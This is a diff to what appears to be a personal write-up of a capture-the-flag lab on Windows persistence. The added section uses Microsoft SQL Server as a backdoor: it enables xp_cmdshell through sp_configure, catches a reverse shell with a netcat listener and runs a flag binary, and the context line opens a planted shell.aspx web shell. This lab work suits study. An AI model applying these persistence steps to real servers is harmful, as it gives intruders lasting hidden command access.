@@ -72,3 +72,30 @@ PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 
 # Using MSSQL as a Backdoor
 1. Started this room's machine
+2. Search for **Microsoft SQL Server Management Studio 18** and launch it
+
+![]()
+
+![]()
+
+3. Launch and execute the following four queries:
+```SQL
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+
+```Bash
+root@ip-10-10-32-42:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+Connection from 10.10.138.69 49758 received!
+```
+
+```PowerShell
+PS C:\Windows\system32> C:\flags\flag17.exe
+THM{I_LIVE_IN_YOUR_DATABASE}
+```
